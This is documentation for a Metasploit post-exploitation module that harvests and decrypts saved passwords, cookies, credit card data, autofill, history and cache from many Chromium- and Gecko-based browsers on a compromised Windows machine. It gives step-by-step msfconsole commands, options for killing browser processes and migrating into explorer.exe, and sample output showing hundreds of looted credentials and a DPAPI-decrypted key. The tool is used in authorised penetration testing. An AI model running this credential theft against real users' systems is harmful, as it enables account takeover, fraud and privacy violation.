
# Vulnerable Application

This post-exploitation module extracts sensitive browser data from both Chromium-based and Gecko-based browsers on the target system. It supports the decryption of passwords and cookies using Windows Data Protection API (DPAPI) and can extract additional data such as browsing history, keyword search history, download history, autofill data, credit card information, browser cache and installed extensions.

## Supported Browsers

### Chromium-Based Browsers

- Microsoft Edge
- Google Chrome
- Opera
- Iridium
- Brave
- CentBrowser
- Chedot
- Orbitum
- Comodo Dragon
- Yandex Browser
- 7Star
- Torch
- ChromePlus
- Komet
- Amigo
- Sputnik
- Citrio
- 360Chrome
- Uran
- Liebao
- Elements Browser
- Epic Privacy Browser
- CocCoc Browser
- Sleipnir
- QIP Surf
- Coowon
- Vivaldi

#### Extracted Data

- Login Data (username/passwords, decrypted)
- Cookies (decrypted)
- Browsing History
- Keyword Search History
- Download History
- Autofill Data
- Credit Card Information
- Bookmarks
- Installed Extensions
- Browser Cache

### Gecko-Based Browsers

- Mozilla Firefox
- Thunderbird
- SeaMonkey
- BlackHawk
- Cyberfox
- K-Meleon
- Icecat
- Pale Moon
- Comodo IceDragon
- Waterfox
- Postbox
- Flock Browser

#### Extracted Data

- Login Data (username/passwords)
- Cookies
- Browsing History
- Keyword Search History
- Download History
- Bookmarks
- Installed Extensions
- Browser Cache

## Verification Steps

1. Start `msfconsole`.
2. Obtain a meterpreter session on the target system.
3. Run the module: `use post/windows/gather/enum_browsers`
4. Set the appropriate session ID: `set SESSION <session id>`
5. (Optional) Specify which browser data to extract: `set BROWSER_TYPE <chromium|gecko|all|string>` (default is `all`).
6. (Optional) Enable verbose mode if you want detailed output: `set VERBOSE true`
7. (Optional) Kill browser processes before extraction to avoid file access issues: `set KILL_BROWSER true`
8. (Optional) Extract Browser Cache: `set EXTRACT_CACHE true`
9. (Optional) Migrate the session to `explorer.exe` before extraction: `set USER_MIGRATION true`
10. Run the module: `run`
11. You should see the extracted browser data in the loot files.

## Options

- **KILL_BROWSER** - Kills browser processes before data extraction. This can help avoid file access issues if the browser is running, particularly for cookies. Default is `false`.
- **USER_MIGRATION** - Migrates the session to `explorer.exe` (if available) before extracting data. This ensures the module is run in the user's context, avoiding potential access issues for user-specific data. Default is `false`.
- **BROWSER_TYPE** - Specifies which browser data to extract. The options are:
  - `all`: Extracts data from both Chromium and Gecko browsers. This is the default setting.
  - `chromium`: Extracts data only from Chromium-based browsers.
  - `gecko`: Extracts data only from Gecko-based browsers.
  - `string`: Extracts data from browsers matching the string supplied (e.g., firefox)
- **EXTRACT_CACHE** - Extract browser cache (may take a long time). It is recommended to set `KILL_BROWSER` to `true` for best results, as this prevents file access issues.
- **VERBOSE** - Prints more detailed output for each step, including encryption key extraction and DPAPI decryption. Default is `false`.
- **SESSION** - The session to run the module on. Required.

## Example Output

### Normal Session

```bash
msf6 post(windows/gather/enum_browsers) > run

[*] Targeting: W00T\ah (IP: 178.238.175.xxx)
[*] System Information: W00T | OS: Windows 11 (10.0 Build 27729). | Arch: x64 | Lang: en_US
[*] Starting data extraction from user profile: C:\Users\ah
[*]
[+] Found Microsoft Edge (Version: 130.0.2849.52)
[+] └ Passwords extracted to /root/.msf4/loot/20241024133803_default_192.168.0.25_MicrosoftEdge_P_875104.json (9 entries)
[+] └ Cookies extracted to /root/.msf4/loot/20241024133803_default_192.168.0.25_MicrosoftEdge_C_236365.json (73 entries)
[+] └ Download history extracted to /root/.msf4/loot/20241024133805_default_192.168.0.25_MicrosoftEdge_D_640039.json (1 entries)
[+] └ Autofill data extracted to /root/.msf4/loot/20241024133806_default_192.168.0.25_MicrosoftEdge_A_971634.json (15 entries)
[+] └ Keyword search history extracted to /root/.msf4/loot/20241024133806_default_192.168.0.25_MicrosoftEdge_K_536287.json (2 entries)
[+] └ Browsing history extracted to /root/.msf4/loot/20241024133807_default_192.168.0.25_MicrosoftEdge_B_675775.json (13 entries)
[+] └ Extensions extracted to /root/.msf4/loot/20241024133817_default_192.168.0.25_MicrosoftEdge_E_869618.json (2 entries)
[+] Found Google Chrome (Version: 130.0.6723.69)
[+] └ Passwords extracted to /root/.msf4/loot/20241024133819_default_192.168.0.25_GoogleChrome_Pa_019394.json (1 entries)
[-] └ Cannot access Cookies. File in use by another process.
[+] └ Autofill data extracted to /root/.msf4/loot/20241024133821_default_192.168.0.25_GoogleChrome_Au_762525.json (2 entries)
[+] └ Browsing history extracted to /root/.msf4/loot/20241024133823_default_192.168.0.25_GoogleChrome_Br_965399.json (6 entries)
[+] └ Extensions extracted to /root/.msf4/loot/20241024133830_default_192.168.0.25_GoogleChrome_Ex_282708.json (2 entries)
[+] Found Opera
[+] └ Cookies extracted to /root/.msf4/loot/20241024133832_default_192.168.0.25_Opera_Cookies_550275.json (90 entries)
[+] └ Browsing history extracted to /root/.msf4/loot/20241024133836_default_192.168.0.25_Opera_BrowsingH_556574.json (33 entries)
[+] └ Extensions extracted to /root/.msf4/loot/20241024133842_default_192.168.0.25_Opera_Extensions_923993.json (3 entries)
[+] Found Brave (Version: 130.1.71.118)
[+] └ Passwords extracted to /root/.msf4/loot/20241024133845_default_192.168.0.25_Brave_Passwords_819196.json (999 entries)
[-] └ Cannot access Cookies. File in use by another process.
[+] └ Download history extracted to /root/.msf4/loot/20241024133905_default_192.168.0.25_Brave_DownloadH_454610.json (16 entries)
[+] └ Autofill data extracted to /root/.msf4/loot/20241024133906_default_192.168.0.25_Brave_AutofillD_214133.json (717 entries)
[+] └ Keyword search history extracted to /root/.msf4/loot/20241024133925_default_192.168.0.25_Brave_KeywordSe_332948.json (719 entries)
[+] └ Browsing history extracted to /root/.msf4/loot/20241024133945_default_192.168.0.25_Brave_BrowsingH_283225.json (5548 entries)
[+] └ Bookmarks extracted to /root/.msf4/loot/20241024133945_default_192.168.0.25_Brave_Bookmarks_611369.json (94 entries)
[+] └ Extensions extracted to /root/.msf4/loot/20241024134003_default_192.168.0.25_Brave_Extensions_187567.json (16 entries)
[+] Found Mozilla Firefox (Version: 131.0.3)
[+] └ Passwords extracted to /root/.msf4/loot/20241024134007_default_192.168.0.25_MozillaFirefox__687013.json (775 entries)
[+] └ Cookies extracted to /root/.msf4/loot/20241024134007_default_192.168.0.25_MozillaFirefox__376733.json (86 entries)
[+] └ Download history extracted to /root/.msf4/loot/20241024134011_default_192.168.0.25_MozillaFirefox__333620.json (2 entries)
[+] └ Keyword search history extracted to /root/.msf4/loot/20241024134012_default_192.168.0.25_MozillaFirefox__670552.json (4 entries)
[+] └ Browsing history extracted to /root/.msf4/loot/20241024134016_default_192.168.0.25_MozillaFirefox__788575.json (2110 entries)
[+] └ Bookmarks extracted to /root/.msf4/loot/20241024134019_default_192.168.0.25_MozillaFirefox__387992.json (175 entries)
[+] └ Extensions extracted to /root/.msf4/loot/20241024134020_default_192.168.0.25_MozillaFirefox__716873.json (2 entries)
[+] └ Browsing history extracted to /root/.msf4/loot/20241024134023_default_192.168.0.25_MozillaFirefox__007127.json (82 entries)
[+] └ Bookmarks extracted to /root/.msf4/loot/20241024134024_default_192.168.0.25_MozillaFirefox__577592.json (82 entries)
[+] Found Thunderbird (Version: 115.11.1)
[+] └ Passwords extracted to /root/.msf4/loot/20241024134026_default_192.168.0.25_Thunderbird_Pass_212412.json (7 entries)
[+] └ Cookies extracted to /root/.msf4/loot/20241024134027_default_192.168.0.25_Thunderbird_Cook_841024.json (4 entries)
[+] └ Extensions extracted to /root/.msf4/loot/20241024134039_default_192.168.0.25_Thunderbird_Exte_337062.json (2 entries)
[*] Post module execution completed
```

### Select only specific browser for extraction 

```bash
msf6 post(windows/gather/enum_browsers) > set BROWSER_TYPE firefox
BROWSER_TYPE => firefox
msf6 post(windows/gather/enum_browsers) > run

[*] Targeting: W00T\ah (IP: 178.238.175.xxx)
[*] System Information: W00T | OS: Windows 11 (10.0 Build 27729). | Arch: x64 | Lang: en_US
[*] Starting data extraction from user profile: C:\Users\ah
[*]
[*] Processing Gecko-based browser: Mozilla Firefox
[+] Found Mozilla Firefox (Version: 131.0.3)
[+] └ Passwords extracted to /root/.msf4/loot/20241024134241_default_192.168.0.25_MozillaFirefox__108310.json (775 entries)
[+] └ Cookies extracted to /root/.msf4/loot/20241024134242_default_192.168.0.25_MozillaFirefox__069542.json (86 entries)
[+] └ Download history extracted to /root/.msf4/loot/20241024134245_default_192.168.0.25_MozillaFirefox__194437.json (2 entries)
[+] └ Keyword search history extracted to /root/.msf4/loot/20241024134246_default_192.168.0.25_MozillaFirefox__572343.json (4 entries)
[+] └ Browsing history extracted to /root/.msf4/loot/20241024134250_default_192.168.0.25_MozillaFirefox__033063.json (2110 entries)
[+] └ Bookmarks extracted to /root/.msf4/loot/20241024134253_default_192.168.0.25_MozillaFirefox__031184.json (175 entries)
[+] └ Extensions extracted to /root/.msf4/loot/20241024134254_default_192.168.0.25_MozillaFirefox__216694.json (2 entries)
[+] └ Browsing history extracted to /root/.msf4/loot/20241024134257_default_192.168.0.25_MozillaFirefox__987518.json (82 entries)
[+] └ Bookmarks extracted to /root/.msf4/loot/20241024134258_default_192.168.0.25_MozillaFirefox__171109.json (82 entries)
[*] Post module execution completed
```

### Using KILL_BROWSER to Resolve File Access Issues

If the browser processes are running, cookies and other files may be locked and inaccessible. Use the `KILL_BROWSER` option to kill browsers before extraction:

```bash
msf6 post(windows/gather/enum_browsers) > set KILL_BROWSER true
KILL_BROWSER => true
```

This will kill any selected & running browser processes and avoid file access issues.

### Using EXTRACT_CACHE to extract browser cache

Extract browser cache (may take a long time). It is recommended to set `KILL_BROWSER` to `true` for best results, as this prevents file access issues.

```bash
msf6 post(windows/gather/enum_browsers) > set EXTRACT_CACHE true
EXTRACT_CACHE => true
msf6 post(windows/gather/enum_browsers) > run

[*] Targeting: W00T\ah (IP: 178.238.175.xxx)
[*] System Information: W00T | OS: Windows 11 (10.0 Build 27723). | Arch: x64 | Lang: en_US
[*] Starting data extraction from user profile: C:\Users\ah
[*]
[*] Found Microsoft Edge (Version: 130.0.2849.46)
[*] 127 cache files found for Microsoft Edge, total size: 13300 KB
[*] Zipping progress: 10% (13/127 files processed)
[*] Zipping progress: 20% (26/127 files processed)
[*] Zipping progress: 30% (39/127 files processed)
[*] Zipping progress: 40% (52/127 files processed)
[*] Zipping progress: 51% (65/127 files processed)
[*] Zipping progress: 61% (78/127 files processed)
[*] Zipping progress: 71% (91/127 files processed)
[*] Zipping progress: 81% (104/127 files processed)
[*] Zipping progress: 92% (117/127 files processed)
[*] Zipping progress: 100% (127/127 files processed)
[*] Cache for Microsoft Edge zipped to: C:\Users\ah\AppData\Local\Temp\ZqNbEJBi.zip
[+] └ Extracted Cache to /root/.msf4/loot/20241020225508_default_192.168.0.25_MicrosoftEdge_C_443896.zip (8763677 bytes)
```

### Using USER_MIGRATION to Run in User Context

If you want to ensure that the session runs in the user context (e.g., `explorer.exe`) to avoid access issues, enable the `USER_MIGRATION` option:

```bash
msf6 post(windows/gather/enum_browsers) > set USER_MIGRATION true
USER_MIGRATION => true
msf6 post(windows/gather/enum_browsers) > run

[*] Found explorer.exe running with PID: 11520. Attempting migration.
[+] Successfully migrated to explorer.exe (PID: 11520).
[*] Targeting: W00T\ah (IP: 178.238.175.xxx).
[*] Starting data extraction from user profile: C:\Users\ah
...
```

### Using VERBOSE Mode for Detailed Output

If you want to see each step of the extraction and decryption process, enable verbose mode:

```bash
msf6 post(windows/gather/enum_browsers) > set VERBOSE true
VERBOSE => true
msf6 post(windows/gather/enum_browsers) > run

[*] Targeting: W00T\ah (IP: 178.238.175.xxx)
[*] System Information: W00T | OS: Windows 11 (10.0 Build 27729). | Arch: x64 | Lang: en_US
[*] Starting data extraction from user profile: C:\Users\ah
[*]
[*] Processing Chromium-based browser: Google Chrome
[+] Found Google Chrome (Version: 130.0.6723.69)
[*] Getting encryption key from: C:\Users\ah\AppData\Local\Google\Chrome\\User Data\Local State
[*] Encrypted key (Base64-decoded, hex): 01000000d08c9ddf0115d1118c7a00c04fc297eb01000000f7481e30d117ce48960717a9d8c48ce9100000001c00000047006f006f0067006c00650020004300680072006f006d00650000001066000000010000200000006ff249e1c36007a6743c96f7d6732b7234bf5dd8bf04362fb935c35d4e83d549000000000e80000000020000200000001725cefb3d4c4432431f2dca4c16d4bdcf33a300c1738072e21fdb8b7a2f6203300000007915215d1c3765f2c30ae5d669906e913a851945370c9d5c0549812144b5c90b520183eee2418e70a7a2994c852a72c84000000001ba99c8683fceeb621c74337b1c2adc5e26e7f6c396a6c331ede1498c439357b90014a0645d6175ffcf144d59d36281f875514e7d6f4ff4d1c824dfc3a3d863
[*] Starting DPAPI decryption process.
[+] Decryption successful.
[+] Decrypted key (hex): 3156f00e36d9a79d267974cbeb47579745f7f6d1b5ca834bef3593757597a629
[+] └ Passwords extracted to /root/.msf4/loot/20241024133716_default_192.168.0.25_GoogleChrome_Pa_359879.json (1 entries)
[-] └ Cannot access Cookies. File in use by another process.
[-] └ Credit cards empty
[-] └ Download history empty
[+] └ Autofill data extracted to /root/.msf4/loot/20241024133718_default_192.168.0.25_GoogleChrome_Au_065463.json (2 entries)
[-] └ Keyword search history empty
[+] └ Browsing history extracted to /root/.msf4/loot/20241024133719_default_192.168.0.25_GoogleChrome_Br_952592.json (6 entries)
[+] └ Extensions extracted to /root/.msf4/loot/20241024133726_default_192.168.0.25_GoogleChrome_Ex_156113.json (2 entries)
[*] Post module execution completed
```
This will show detailed information, such as:

- The extraction of encryption keys from local state files.
- The decryption of data using DPAPI.
- Success or failure messages for each extraction step.

## Potential Errors

- **Cookies file in use**: If the cookies database is locked by the browser, you may encounter an error message similar to:

  ```bash
  [-] Cannot access Cookies. File in use by another process.
  ```

  You can resolve this by setting `KILL_BROWSER` to `true`.
